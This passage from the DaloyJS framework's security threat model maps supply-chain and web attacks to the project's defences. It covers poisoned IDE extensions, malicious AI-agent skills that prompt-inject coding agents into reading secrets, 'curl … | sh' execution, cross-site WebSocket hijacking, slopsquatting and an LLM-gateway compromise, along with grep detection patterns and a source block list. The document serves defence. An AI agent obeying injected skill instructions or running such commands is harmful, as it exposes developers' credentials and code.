| Cross-ecosystem credential pivot: a stolen PyPI / npm / GitHub token from one developer's machine is used to push the *next* trojaned release into a different ecosystem | Hardware-backed 2FA is mandatory on **every** account with publish rights to `@daloyjs/core` or `create-daloy`, configured at both the GitHub organization and npm registry levels (`npm access 2fa-required`). Publishes only run from `release.yml` under the protected `npm-publish` GitHub Environment with explicit maintainer approval; the pre-publish `verify` job refuses to publish unless the actor on the run is listed in the **Active** block of [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md). A stolen developer-workstation token without 2FA cannot pivot into a Daloy publish. |
| Worm behavior: the payload uses the victim's credentials to scan their other repos and silently push trojaned versions of any package they maintain | `CODEOWNERS` ([`.github/CODEOWNERS`](.github/CODEOWNERS)) requires a maintainer review for any change under `.github/`, `package.json`, `pnpm-lock.yaml`, or `.npmrc`. Signed commits + signed `v*` tags + provenance attestation mean a worm cannot quietly land an unsigned commit-then-tag on `main` and trigger `release.yml`; the release gate also rejects publishes whose tag/version don't match. |

**What this does not defend against, and we say so explicitly:**

- A Daloy consumer who also runs `pip install lightning` (or any other
  trojaned PyPI package) **inside the same container or CI runner** as
  their Daloy app. PyPI is a different supply chain than npm; the
  `minimum-release-age` / `ignore-scripts` / `blockExoticSubdeps`
  defenses do not cross the boundary. If your app's container also
  installs Python dependencies, mirror the same controls on the Python
  side (`uv pip install --exclude-newer=<24h-ago>`, separate
  build-and-runtime images, no shell / compiler in the runtime image).
- A future malicious `@daloyjs/core` look-alike that fires at **import
  time** *and* survives the 24 h cooldown because nobody reported it.
  Defence in depth is the audit pipeline (Scorecard, CodeQL, `pnpm audit
  --prod`), the zero-runtime-deps posture (a look-alike that mimics
  the dependency tree of a zero-dep package is harder to make
  plausible), and consumer-side review of any new `@daloyjs/*` name
  that is not `core` or `create-daloy`.
- A consumer's runtime that allows handlers to call `fetch` against an
  arbitrary URL and pipe the body into `child_process.spawn`. Daloy
  cannot stop developer code from downloading and executing a Bun
  binary at runtime. The runtime's network policy and the container's
  filesystem (read-only `/`, no `/tmp` executable, distroless base) are
  the only line of defense for that step. The framework's contribution
  is making sure **the framework itself** does not do this and does not
  enable it (no eval, no template engine, no codegen-at-request-time).
- A compromise that lands as a *new* `@daloyjs/*` package name (a
  slopsquat or look-alike). See the **Slopsquatting / AI package
  hallucination** section below — the controls overlap but the residual
  risk is the consumer paying attention to which `@daloyjs/*` names are
  legitimate.

If you suspect a Lightning-style import-time payload in an npm package
you depend on alongside `@daloyjs/core`:

- Pull the unpacked tarball (`pnpm pack <name>@<version>` then extract)
  and grep for `Buffer.from(..., "base64")`, `vm.runIn*Context`,
  `child_process`, `eval(`, and large embedded blobs in any
  top-level-imported file.
- Compare the published tarball's provenance attestation against the
  source commit on the upstream repo. A missing or mismatched
  attestation is the strongest signal.
- Look for a `_runtime/` (or similarly disguised) directory in the
  unpacked layout — Lightning hid the Bun bundle in
  `_runtime/router_runtime.js`.
- Report to the upstream registry and to <https://github.com/daloyjs/daloy/security/advisories/new>
  if any `@daloyjs/*` look-alike is involved.

### IDE-extension compromise on a maintainer workstation (GitHub 2026-05-20 pattern)

Aikido and BleepingComputer's 2026-05-20 disclosure of the
[GitHub-internal-repos breach via a poisoned VS Code extension](https://www.aikido.dev/blog/github-breached-vs-code-extension)
(~3,800 internal repositories exfiltrated after a GitHub employee installed
a malicious extension from the official marketplace) is a different
ecosystem from npm and most of the controls in the two tables above do
**not** apply to it directly — the malicious code never enters
`pnpm-lock.yaml`, never executes a `postinstall` script, and never has to
defeat `minimum-release-age`. It runs in the developer's editor process
with whatever filesystem and network access that editor has. We list it
here because operators have asked, and because being honest about the
boundary matters more than pretending we have a control we do not have.

**What a backend framework cannot do.** Daloy cannot stop a maintainer or
a consumer from installing a poisoned VS Code, Cursor, JetBrains, or
Zed extension. That is a workstation-hygiene problem (signed extensions,
publisher verification, extension allowlists, EDR) and is owned by the
developer's operating environment, not by `@daloyjs/core`.

**What Daloy does do**, mapped step-by-step against the GitHub incident:

| Attack step | DaloyJS / template control |
| --- | --- |
| Malicious extension reads source files in the open workspace | Out of scope for a framework. We do not commit secrets to the repo (no `.env`, no long-lived tokens in `.github/`), and every scaffolded template's [`_gitignore`](packages/create-daloy/templates/node-basic/_gitignore) excludes `.env`, `.env.*` (with a `!.env.example` allowlist), `dist/`, and `coverage/` so an attacker reading the workspace gets configuration shape, not credentials. |
| Malicious extension reads tokens from the OS keychain, shell history, or `~/.npmrc` | Out of scope for a framework. Our mitigation is that **no maintainer holds a long-lived `NPM_TOKEN`** — publishes happen through OIDC + Sigstore from `release.yml`, not from any dev machine (see § npm publishing). A scraped `~/.npmrc` from a Daloy maintainer's laptop yields no publish credential for `@daloyjs/*`. |
| Malicious extension exfiltrates the contents of a private repository | Out of scope for a framework. For `@daloyjs/daloy` itself, the public repository is the source of truth and there is nothing private to exfiltrate. For *consumer* applications, secret-scanning (GitHub Advanced Security, `gitleaks`, etc.) and short-lived cloud credentials are the operator's responsibility — we recommend both in the threat-model section above. |
| Malicious extension silently mutates `package.json` / `pnpm-lock.yaml` to introduce a typosquatted dep | Caught at PR review: `package.json` and `pnpm-lock.yaml` are CODEOWNERS-protected ([`.github/CODEOWNERS`](.github/CODEOWNERS)), CI runs `pnpm install --frozen-lockfile`, and `pnpm verify:lockfile` ([`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts)) rejects any `git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…`, or non-`registry.npmjs.org` source. `minimumReleaseAge: 1440` then blocks install of a freshly published trojan dep even if one slipped past review. |
| Malicious extension stages a commit to `.github/workflows/*` to weaken CI (e.g. drop `harden-runner`, add `pull_request_target`, unpin an action) | Caught at PR review: `.github/` is CODEOWNERS-protected, `zizmor` statically rejects unsafe workflow patterns ([`.github/workflows/zizmor.yml`](.github/workflows/zizmor.yml)), and `pnpm verify:governance-audits` ([`scripts/verify-governance-audits.ts`](scripts/verify-governance-audits.ts)) refuses the PR if the top-level `permissions:` block, `persist-credentials: false`, the SHA-pin on a third-party action, or `step-security/harden-runner` is removed. |
| Malicious extension steals a maintainer's GitHub PAT and uses it to push directly to `main` or to publish a release | Branch protection on `main` requires PR review (CODEOWNERS-enforced for sensitive paths). The publish job (`release.yml`) is triggered only by a signed `v*` tag plus explicit maintainer dispatch for `create-daloy`, runs only in the `npm-publish` protected GitHub Environment, and requires a second listed maintainer to approve the environment before any `pnpm publish` runs. A stolen single-account PAT does not produce a release on its own. |
| Malicious extension installs an auto-update hook that re-poisons after cleanup | Outside our boundary. The standard recovery is to uninstall the extension, rotate maintainer credentials (npm, GitHub, recovery email — same drill as the `node-ipc` 2026-05-14 reload), and run the quarterly disclosure exercise out of cycle. |

**What this does not defend against, and we say so explicitly:**

- A maintainer installing a poisoned extension and then approving their
  own subsequent malicious PR. CODEOWNERS requires a reviewer; branch
  protection enforces it. The `npm-publish` environment requires a
  second approver. None of these survive *two* compromised maintainer
  accounts — that is the threat model that hardware-backed 2FA on every
  active maintainer and the off-boarding checklist exist to make
  expensive.
- A consumer of `@daloyjs/core` who installs a poisoned VS Code
  extension in their own application repo. The blast radius there is
  whatever that extension can reach in the consumer's workspace, which
  is unrelated to Daloy. Our recommended posture for consumers mirrors
  ours: `.env*` in `.gitignore` (already shipped in every template
  `_gitignore`), no long-lived cloud credentials on disk, branch
  protection on the deploy branch, and OIDC-based publishing /
  deployment instead of static tokens.

If a future incident report describes an attack step that any control in
the table above should have blocked, treat the gap as a release-blocking
bug and open a private advisory.

### Malicious AI-agent skills on a maintainer or consumer workstation (ToxicSkills / ClawHub 2026 pattern)

Snyk's 2026 ["ToxicSkills" research](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
(plus the parallel "ClawHavoc" / `clawdhub` malicious-campaign disclosures
and Mobb.ai's audit of 22,511 public skills) documents prompt-injection
payloads in **~36%** of audited skills and **1,467 confirmed malicious
payloads** across the ClawHub, OpenClaw, and Claude Code skill registries.
The attack shape is: an AI coding agent (Claude Code, Cursor, OpenClaw,
etc.) loads a "skill" — a markdown / YAML / shell bundle — from a public
registry, and that skill either prompt-injects the agent into
exfiltrating files and tokens or directly executes attacker-controlled
shell commands with the developer's local privileges. The malicious code
never enters `package.json` or `pnpm-lock.yaml`, so none of the
npm-focused controls in the `node-ipc` / `shopsprint` / `axios` / `@antv` tables
above apply directly. We list it here for the same reason we list the
GitHub VS Code-extension breach above: operators ask, and the honest
answer is that some of this is outside a backend framework's boundary.

**What a backend framework cannot do.** Daloy cannot stop a maintainer or
a consumer from installing a poisoned skill into Claude Code, Cursor,
OpenClaw, Continue, Aider, Windsurf, Zed, or any other agent runtime.
Those runtimes execute skills with whatever filesystem, network, and
credential access the developer's shell has, which is far more than any
HTTP framework can mediate. Skill-registry hygiene (signed publishers,
allowlists, isolation, sandboxing) is owned by the agent runtime and the
developer's operating environment.

**What Daloy does do**, mapped step-by-step against the ToxicSkills pattern:

| Attack step | DaloyJS / template control |
| --- | --- |
| Poisoned skill prompt-injects the agent into reading `.env`, `~/.npmrc`, the macOS / Linux keychain, or shell history | Out of scope for a framework. Mitigation in our own repo: no `.env` is committed, no long-lived `NPM_TOKEN` exists on any maintainer machine (publish runs from `release.yml` via OIDC, see § npm publishing), and every scaffolded template's [`_gitignore`](packages/create-daloy/templates/node-basic/_gitignore) excludes `.env`, `.env.*` (with a `!.env.example` allowlist), `dist/`, `coverage/`, and `*.log` so a skill reading the workspace gets configuration shape, not credentials. |
| Poisoned skill executes a shell command (`curl … \| sh`, `npm publish`, `git push`) under the developer's identity | Outside our boundary at runtime. The release-side blast radius is bounded because **no publish happens from a developer machine** — `release.yml` is the only path to `npm publish` for `@daloyjs/core` / `create-daloy`, it requires a signed `v*` tag, it runs only in the protected `npm-publish` GitHub Environment, and that environment requires a second listed maintainer to approve before any publish job executes. A skill that ran `npm publish` on a maintainer laptop would fail for lack of a publish-capable token. |
| Poisoned skill silently edits `package.json`, `pnpm-lock.yaml`, `.npmrc`, or a workflow under `.github/` to weaken CI or introduce a typosquatted dep | Caught at PR review. Those paths are CODEOWNERS-protected ([`.github/CODEOWNERS`](.github/CODEOWNERS)); CI runs `pnpm install --frozen-lockfile`; `pnpm verify:lockfile` ([`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts)) rejects `git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…`, and non-`registry.npmjs.org` sources; `pnpm verify:governance-audits` ([`scripts/verify-governance-audits.ts`](scripts/verify-governance-audits.ts)) refuses removal of `permissions:`, `persist-credentials: false`, action SHA-pins, or `step-security/harden-runner`; `zizmor` statically rejects unsafe workflow patterns ([`.github/workflows/zizmor.yml`](.github/workflows/zizmor.yml)). Even with a fully compromised agent on a maintainer laptop, the malicious change has to clear a human review under those gates. |
| Poisoned skill stages a backdoor inside `src/` (e.g. weakens a header sanitizer, removes a rate-limit guard, downgrades a JWT algorithm allowlist) | Caught at PR review plus the static governance gates: `pnpm verify:parity-audits`, `pnpm verify:governance-audits`, `pnpm verify:runtime-parity-audits`, `pnpm verify:routing-hardening-audits`, and `pnpm verify:secret-comparisons` enforce the documented security floor. CodeQL and the test suite (with the 90% line / 90% function / 90% branch coverage gates) run on every PR. A backdoor that bypasses all of those would have to be subtle enough to pass code review on `src/security.ts`, `src/hashing.ts`, `src/jwt.ts`, etc. — review is the last line of defense and there is no shortcut around it. |
| Poisoned skill exfiltrates the contents of the open workspace over HTTP / DNS / a third-party MCP server | Out of scope for a framework. For `@daloyjs/daloy` itself the workspace is the public repository and there is nothing private to exfiltrate. For consumer applications, secret-scanning (GitHub Advanced Security, `gitleaks`, etc.), short-lived cloud credentials, and developer-workstation egress controls are the operator's responsibility — the same posture we recommend against the GitHub VS Code-extension breach above. |
| Skill vendors a malicious npm dep transitively (skill says "install X" and X is a typosquat) | If the agent obeys and runs `pnpm add`, every other control in this document applies: `ignore-scripts=true` blocks lifecycle payloads, `minimumReleaseAge: 1440` blocks fresh trojan releases, `blockExoticSubdeps: true` plus `pnpm verify:lockfile` reject non-registry sources, `@daloyjs/core`'s zero-runtime-dep posture means *we* never pull the typosquat in, and the CODEOWNERS-guarded lockfile means the change has to clear PR review. |
| Skill registry is taken down but the cached malicious skill remains pinned in a dev's local agent cache | Outside our boundary. Agent runtimes own their skill cache. Recovery is the same drill as the `node-ipc` 2026-05-14 reload and the VS Code-extension breach: uninstall the skill, rotate the affected maintainer's npm and GitHub credentials and recovery email (the quarterly disclosure exercise verifies all three), and run the disclosure exercise out of cycle. |

**Daloy-repo policy on agent skills (workstation hygiene).** Because the
framework cannot police skill registries, we constrain what enters *this*
repository:

- The repository does not vendor, recommend, or pre-install any
  third-party AI-agent skill, Claude Code skill, Cursor rule pack,
  OpenClaw skill, or equivalent. The only agent-facing files in this
  repo are first-party and reviewed under the normal CODEOWNERS path:
  [`AGENTS.md`](AGENTS.md), [`.github/copilot-instructions.md`](.github/copilot-instructions.md),
  and the per-area `AGENTS.md` files (e.g. [`website/AGENTS.md`](website/AGENTS.md)).
- No template under [`packages/create-daloy/templates/`](packages/create-daloy/templates)
  ships a third-party skill bundle, agent ruleset, or MCP-server config
  pointing at a public skill registry. Scaffolded apps therefore inherit
  zero pre-installed skill surface from us.
- A PR that adds a third-party skill, rule pack, or agent-cache
  directory (`.claude/skills/`, `.cursor/rules/`, `.openclaw/`,
  `.continue/`, `.aider/`, `.windsurf/`, `.zed/ai/`, or any similar
  per-tool directory containing executable instructions sourced from
  outside this repo) must be treated as a supply-chain change: it
  requires the same maintainer review and justification as a new
  runtime dependency, and must come from a publisher and version the
  reviewer can verify by hand. "I downloaded this from ClawHub /
  OpenClaw / the Cursor directory and it looked useful" is **not**
  sufficient justification.
- Maintainers who use an AI agent against this repo are expected to run
  it under the agent's least-privilege mode (deny shell exec by
  default, allowlist tools explicitly) and to review every diff before
  committing. The CODEOWNERS, branch-protection, and
  `npm-publish`-environment controls described above assume diffs are
  human-reviewed; an agent that auto-approves its own PRs would defeat
  that assumption.

**What this does not defend against, and we say so explicitly:**

- A maintainer installing a poisoned skill in their personal Claude
  Code / Cursor / OpenClaw setup and then merging the skill's
  suggestions without reading them. CODEOWNERS requires a reviewer for
  sensitive paths and the `npm-publish` Environment requires a second
  approver, so a single compromised maintainer cannot ship a poisoned
  release on their own — but two compromised maintainers can, which is
  why hardware-backed 2FA on every active maintainer and the off-boarding
  checklist exist to make that expensive.
- A consumer of `@daloyjs/core` who installs a poisoned skill in their
  own application repo. The blast radius is whatever that skill can
  reach in the consumer's workspace, which is unrelated to Daloy. Our
  recommended posture for consumers mirrors ours: do not vendor
  third-party skills, keep `.env*` in `.gitignore` (already shipped in
  every template `_gitignore`), no long-lived cloud credentials on
  disk, branch protection on the deploy branch, and OIDC-based
  publishing / deployment instead of static tokens.
- Prompt-injection content hosted in *data* the framework processes
  (request bodies, third-party API responses). That is application-level
  input validation owned by the handler author; Daloy does not auto-feed
  request data to an LLM.

If a future incident report describes an attack step that any control in
the table above should have blocked, treat the gap as a release-blocking
bug and open a private advisory.

### Cross-Site WebSocket Hijacking on a dev/admin server (Storybook CVE-2026-27148 pattern)

Aikido's 2026 disclosure of the
[Storybook WebSocket hijack](https://www.aikido.dev/blog/storybooks-websockets-attack)
([CVE-2026-27148](https://app.opencve.io/cve/CVE-2026-27148)) is the
representative case for a class of bug that ships in many runtime
frameworks: the WebSocket upgrade endpoint authenticates the user with
cookies but does **not** validate the `Origin` header. A browser
*always* attaches cookies to a WS handshake regardless of which page
triggered it, so a victim visiting `evil.example` while their local
Storybook (or any cookie-authenticated WS server) is running silently
hands the attacker a fully authenticated control channel — Storybook's
specific impact was overwriting story files on disk and reaching RCE on
the developer's workstation.

| Attack step | DaloyJS / template control |
| --- | --- |
| Malicious page calls `new WebSocket("ws://victim-host/...")`; the browser opens the handshake with the victim's cookies attached | `app.ws()` in production with `secureDefaults` refuses-at-registration unless the route declares an `allowedOrigins` policy (`"same-origin"`, a string allowlist, or a predicate) or explicitly opts out via `acknowledgeCrossOriginUpgrade: true`. The CSWSH gate is an *additional* check on top of the existing `beforeUpgrade` / `acknowledgeUnauthenticated` gate — cookie auth alone is no longer a sufficient acknowledgement, because cookie auth is exactly what CSWSH abuses. |
| The server's `beforeUpgrade` hook reads the cookie, finds a valid session, and accepts the handshake | `checkWebSocketOrigin()` runs **before** `beforeUpgrade` in both the Node and Bun adapters. A cross-origin handshake is rejected with `403` and `beforeUpgrade` is never invoked, so an authenticated handler cannot accidentally bless the attacker's connection. |
| The attacker sends authenticated WS messages (modify state, exfiltrate data, write files, achieve RCE through a "write story to disk" RPC like Storybook's) | The CSWSH guard refuses the handshake before any message is received. A non-browser client (CLI, server-to-server) that does not send `Origin` still passes the `same-origin` and array-allowlist policies; callers that want to require an `Origin` for every client may pass a predicate (`(origin) => origin !== null && allowed.has(origin)`). |
| The attacker uses a `null` origin (sandboxed iframe, file://, some browser extensions) to evade a naive `Origin` check | Daloy's policies compare against the exact `Origin` string the server received, so `"null"` is treated as just another origin — `"same-origin"` and a typical string allowlist both reject it. The predicate form gives the operator the final say. |

What this **does not** defend against, and we say so explicitly:

- A route that opts in via `acknowledgeCrossOriginUpgrade: true` and
  then exposes a state-changing protocol over WS. The acknowledgement
  flag is exactly the place where the operator owns the decision; if
  the route is truly cross-origin (a public broadcast feed, a
  no-cookie WS used only with bearer tokens out of the URL), CSWSH is
  not reachable and the flag is correct. If the route is
  cookie-authenticated, the flag is wrong and the refuse-at-startup
  message names the route so review can catch it.
- A custom WS adapter that bypasses `app.webSocketRoutes` and calls
  the adapter's raw upgrade primitive directly. The CSWSH check is
  wired into the Node and Bun adapters; bespoke adapters are
  responsible for calling `checkWebSocketOrigin()` themselves before
  invoking `beforeUpgrade`.

If a future incident report describes an attack step that any control in
the table above should have blocked, treat the gap as a release-blocking
bug and open a private advisory.

### Slopsquatting / AI package hallucination (Aikido 2025 pattern)

Aikido's ["Slopsquatting: When AIs hallucinate packages" research](https://www.aikido.dev/blog/slopsquatting-ai-package-hallucination-attacks)
(and the original [Lasso / "Package Hallucination"](https://arxiv.org/abs/2406.10279)
study before it) documents a supply-chain attack shape that is adjacent
to classical typosquatting but driven by AI coding assistants: the LLM
**hallucinates a package name that does not exist** (`request-promise-native2`,
`pyjson-utils`, `@types/fastify-helmet`, etc.) and confidently emits
`pnpm add <hallucination>`. An attacker who has been watching public LLM
output simply registers that name on npm with a malicious payload, and
the next developer / agent that copies the suggestion installs the
trojan. The hallucinated name often *sounds* plausible, so it survives
visual review in a way a classical typo (`expresss`, `lodahs`) does not.

This is the same attack surface as the "Skill vendors a malicious npm
dep transitively" row in the ToxicSkills table above — but it also
applies when no skill is involved, just a base-model LLM the developer
trusts. We list it explicitly because operators ask, and because as of
2025 the share of `pnpm add` invocations originating from an AI agent
inside a coding IDE is non-trivial.

**Daloy's mitigations, mapped step by step against slopsquatting:**

| Attack step | DaloyJS / template control |
| --- | --- |
| LLM emits `pnpm add <hallucinated-name>` and the developer / agent runs it without verifying the package exists | Outside any framework's boundary. We document the recommended posture in [`AGENTS.md`](AGENTS.md) ("review every diff before committing", least-privilege agent mode) and in the malicious-skills section above. The framework's job is to make sure that *if* the bad install happens, the blast radius is bounded by the controls below. |
| Attacker pre-registered the hallucinated name on npm and pushed a fresh malicious version inside the last 24 hours | `minimum-release-age=1440` in this repo's [`.npmrc`](.npmrc) **and** in every scaffolded template's `_npmrc` ([`packages/create-daloy/templates/node-basic/_npmrc`](packages/create-daloy/templates/node-basic/_npmrc), `bun-basic`, `cloudflare-worker`, `vercel-edge`, etc.) refuses to resolve any version published less than 24 hours ago. Slopsquat packages are typically detected and unpublished or de-listed inside that window — the same property that defended us against the `node-ipc` 2026-05-14 reload. |
| Malicious package ships a `postinstall` / `preinstall` / `prepare` hook that exfiltrates `~/.npmrc`, `.env`, SSH keys, or the keychain on `pnpm install` | `ignore-scripts=true` in this repo's [`.npmrc`](.npmrc) and every template's `_npmrc` suppresses every lifecycle script. Packages permitted to build are listed explicitly in `pnpm.onlyBuiltDependencies` and `pnpm-workspace.yaml#onlyBuiltDependencies` (currently only `esbuild` in the framework; templates ship an empty allowlist). pnpm 11's `strictDepBuilds: true` (framework only — see § Supply chain) hard-refuses any newly added dep that *needs* to build. |
| Malicious package declares the trojan source via `git+ssh://` / `github:owner/repo#<sha>` / a non-`registry.npmjs.org` tarball URL to bypass registry-side scanning | `blockExoticSubdeps: true` in [`pnpm-workspace.yaml`](pnpm-workspace.yaml) and every template's `pnpm-workspace.yaml` refuses to install exotic sub-deps in the first place. `pnpm verify:lockfile` ([`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts)) is wired into [`ci.yml`](.github/workflows/ci.yml) and the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml); it rejects `git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…`, `http:` URLs and any tarball whose origin is not the official npm registry. |
| Hallucinated dep transitively lands inside `@daloyjs/core`'s published tarball, infecting every consumer | `@daloyjs/core` has **zero runtime dependencies** (only `zod` as a peer). [`scripts/verify-no-runtime-deps.ts`](scripts/verify-no-runtime-deps.ts) runs as `pnpm verify:no-runtime-deps` in CI and in the pre-publish `verify` job and fails the build if any `dependencies` entry is added to the published manifest. Even a slopsquat that lands in `pnpm-lock.yaml` as a dev-only dep cannot leak into the tarball we ship. |
| Hallucinated dep lands in `pnpm-lock.yaml` via a PR (agent-authored or otherwise) | [`pnpm-lock.yaml`](pnpm-lock.yaml) is CODEOWNERS-protected ([`.github/CODEOWNERS`](.github/CODEOWNERS)); CI runs `pnpm install --frozen-lockfile`; `pnpm audit --prod` and `pnpm verify:lockfile` reject unsigned / non-registry sources; maintainer review is the last line of defence. A PR that adds a package name no reviewer recognises is the failure mode `AGENTS.md` warns about and reviewers are instructed to push back on. |
| Slopsquat ships a typo of an *internal* Daloy export (`@daloyjs/cor`, `@daloyjs/core-utils`) to look like a sibling package | The `@daloyjs` npm scope is owned by the maintainer team and protected by hardware-backed 2FA; no third party can publish under it. Scaffolded templates only ever reference `@daloyjs/core` and `create-daloy`, both pinned by `create-daloy` to the matching release. There is no `@daloyjs/*` sub-package surface for a slopsquatter to plausibly imitate. |

**What this does not defend against, and we say so explicitly:**

- A developer who runs `pnpm add <hallucinated-name> --ignore-scripts=false` or otherwise overrides our defaults. The defaults are advisory at the consumer side; if a project disables them, the controls listed above do not apply.
- A slopsquat that survives the 24-hour `minimum-release-age` window because nobody reported it. This is the same residual risk as classical typosquatting; defence-in-depth is `ignore-scripts=true` + `blockExoticSubdeps: true` + maintainer review of every new dep name.
- A slopsquat installed *globally* (`pnpm add -g`) outside any project's `.npmrc`. Global installs do not inherit the project's cooldown; we recommend against `-g` for security-sensitive tooling and have none in our own developer setup.

If you encounter a slopsquatted package referencing `@daloyjs/*` (e.g. `daloyjs`, `daloy-core`, `@daloyjs/cli`, `create-daloyjs`), report it via the npm abuse form *and* file a private advisory at <https://github.com/daloyjs/daloy/security/advisories/new> so we can warn other operators.

### AI gateway blast radius (LiteLLM 2026 pattern)

Snyk's 2026
["You Patched LiteLLM, But Do You Know Your AI Blast Radius?"](https://snyk.io/blog/litellm-ai-blast-radius/)
writeup documents an attack shape that is going to become the dominant
post-2026 incident class as more apps proxy prompts to LLM providers:

1. **Pre-auth SQL injection in the gateway's authentication path
   ([CVE-2026-42208](https://www.sysdig.com/blog/cve-2026-42208-targeted-sql-injection-against-litellms-authentication-path-discovered-36-hours-following-vulnerability-disclosure))**
   gives an unauthenticated attacker arbitrary SQL — and from there RCE —
   on the LiteLLM proxy. Exploitation in the wild was observed
   ~36 hours after disclosure.
2. **Supply-chain compromise ([CVE-2026-33634](https://www.averlon.ai/blog/cve-2026-33634-trivy-and-litellm-supply-chain-attacks))**
   pushed a trojaned LiteLLM release that ran on first import.
3. **Blast radius**: a compromised gateway concentrates *every*
   downstream provider's API keys (OpenAI, Anthropic, Google, Azure,
   Cohere, Mistral, Groq, HuggingFace, Replicate), every system prompt,
   every user prompt, and every model response. A single RCE on the
   gateway pivots into the customer's entire AI stack — and, because
   those provider keys are usually billed monthly, into the customer's
   credit card too.

DaloyJS is **not** an AI gateway and we do not ship one. But many apps
built on Daloy *do* sit in front of LLM providers — chat backends,
RAG endpoints, agent runtimes, code-review bots — and they inherit the
same blast-radius shape. The mitigations below are the controls we
already ship, plus one targeted addition (AI-provider-key redaction in
the default logger) to close the most common log-leak surface for that
class of app.

| Attack step | DaloyJS / template control |
| --- | --- |
| Pre-auth SQL injection in a developer-written auth handler ("look up the user / token in Postgres") | Out of scope as a generic SQL defense (see § Explicitly out of scope — "Insecure handler code"), but Daloy narrows the **input surface** that reaches such handlers: the router rejects `..` and `//` before walking, `useSemicolonDelimiter: false` is the hardline default in [`src/router.ts`](src/router.ts) so `/users/42;'--` stays a single literal path segment, core `safeJsonParse` strips `__proto__` / `constructor` / `prototype`, header sanitization rejects CRLF + NUL, and JSON-schema validation runs **before** the handler. The reachable injection surface is the parameters the handler explicitly destructures from a validated body — and developer guidance throughout the docs is "use parameterized queries / a query builder, never string-concat SQL". |
| Brute-forced or rapid-fire exploitation against the auth path (the 36-hour LiteLLM window) | Ship `rateLimit()` from [`src/middleware.ts`](src/middleware.ts) on every auth-bearing route (the docs example wires it directly to `/login`, `/token`, and the OAuth callback). `trustProxyHeaders` defaults to `false` so a single attacker IP cannot spoof its source via `X-Forwarded-For`. Pair with [`src/load-shedding.ts`](src/load-shedding.ts) (`loadShedding()`) so a single attacker cannot also DoS the gateway off the air while the exploit chain runs. |
| Timing oracle on the auth comparison ("does this token exist? does this hash match?") | First-party `timingSafeEqual()` from [`src/hashing.ts`](src/hashing.ts) plus `basicAuth({ verify })` verifier hooks designed for constant-time password / API-key checks. `scripts/verify-secret-comparisons.ts` runs as `pnpm verify:secret-comparisons` and refuses any PR that introduces a non-constant-time comparison against a secret-shaped variable in `src/` — the gate catches `===`, `!==`, `==`, `!=`, **and** the short-circuiting `.startsWith()` / `.endsWith()` / `.includes()` / `.indexOf()` / `.localeCompare()` family that the CCC CTF "Node.js timing attack" challenge exploited ([Snyk write-up](https://snyk.io/blog/node-js-timing-attack-ccc-ctf/)). Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts). |
| RCE shell-out from a "convenient" handler that takes a user-supplied template/parameter and runs it through `exec` / `eval` / `new Function` | Out of scope as a generic eval defense, but `step-security/harden-runner` on the **publish** workflow blocks egress from CI — a compromised dev dep on the maintainer's machine cannot phone home from the publish runner. For consumer apps we recommend: never call `eval` / `new Function` on prompt content; never pass model output to `child_process.spawn`; and place the app behind `secureHeaders()` so a stored-XSS pivot through an admin dashboard is contained (CSP nonce + Trusted Types + COOP/CORP). |
| Stored / exfiltrated **provider API keys** appearing in structured logs (a single `logger.info({ headers: req.headers })` is enough) | The default logger from [`src/logger.ts`](src/logger.ts) redacts not just `authorization` / `cookie` / `x-api-key` / `token` but also **every common LLM-provider credential header** as of `@daloyjs/core` 0.34.0: `openai-api-key`, `x-openai-api-key`, `anthropic-api-key`, `x-anthropic-api-key`, `x-api-key-anthropic`, `x-goog-api-key`, `google-api-key`, `x-google-api-key`, `azure-api-key`, `x-azure-api-key`, `api-key-azure`, `cohere-api-key`, `x-cohere-api-key`, `mistral-api-key`, `x-mistral-api-key`, `groq-api-key`, `x-groq-api-key`, `replicate-api-token`, `huggingface-api-key`, `x-huggingface-api-key`, `x-litellm-master-key`, `litellm-master-key`, `litellm-api-key`. Matched case-insensitively at every depth of the log record. Locked by a regression test in [`tests/logger-redaction-and-header-smuggling.test.ts`](tests/logger-redaction-and-header-smuggling.test.ts). Combined with the existing JWT-shaped-string redaction (`redactJwtLikeStrings: true` by default), an accidental `logger.info({ req })` cannot leak a provider key into the log stream. |
| 5xx error pages leaking the SQL fragment / prompt / provider key in the `detail` field of a problem+json response | Production mode strips `detail` from every 5xx problem+json automatically (see § In scope — "5xx info disclosure"). Stack traces never reach the client in `NODE_ENV=production`. |
| Supply-chain compromise of the AI gateway itself (the LiteLLM CVE-2026-33634 path: a trojaned release executes on first import) | Same controls as every other supply-chain section above: `minimum-release-age=1440` (24 h cooldown) in root [`.npmrc`](.npmrc) and every template `_npmrc`; `ignore-scripts=true` in both; [`scripts/verify-no-lifecycle-scripts.ts`](scripts/verify-no-lifecycle-scripts.ts) refuses any install-time hook on a published manifest; `blockExoticSubdeps: true` in [`pnpm-workspace.yaml`](pnpm-workspace.yaml); [`pnpm verify:lockfile`](scripts/verify-lockfile-sources.ts) rejects any tarball whose origin is not `registry.npmjs.org`; `@daloyjs/core`'s zero-runtime-dep posture means importing the framework cannot transitively pull a trojanized package. |
